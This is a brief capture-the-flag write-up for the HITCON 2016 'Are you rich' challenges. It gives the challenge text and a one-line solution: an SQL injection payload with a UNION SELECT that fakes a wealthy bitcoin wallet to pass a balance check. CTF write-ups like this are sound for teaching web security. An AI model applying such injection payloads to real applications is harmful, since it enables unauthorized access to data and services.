#hitcon 2016 : Are you rich 1 and Are you rich 2
Solved by illustris
##Challenge

###Are you rich?
```
249 Teams solved.
Description
Are you rich? Buy the flag!
http://52.197.140.254/are_you_rich/
ps. You should NOT pay anything for this challenge
Some error messages which is non-related to challenge have been removed
Hint
None
```

###Are you rich 2 ?
```
117 Teams solved.
Description
Are you rich? Buy the flag!
http://52.197.140.254/are_you_rich/
ps. You should NOT pay anything for this challenge
Some error messages which is non-related to challenge have been removed
Hint
None
```

##Solution
I looked up the richest bitcoin wallet. As of when I wrote this, it was
>https://bitinfocharts.com/bitcoin/address/3Nxwenay9Z8Lc9JBiywExpnEFiLp6Afp8v

Both flags can now be obtained by SQL injection
>3Nxwenay9Z8Lc9JBiywExpnEFiLp6Afp8v' UNION SELECT '3Nxwenay9Z8Lc9JBiywExpnEFiLp6Afp8v';#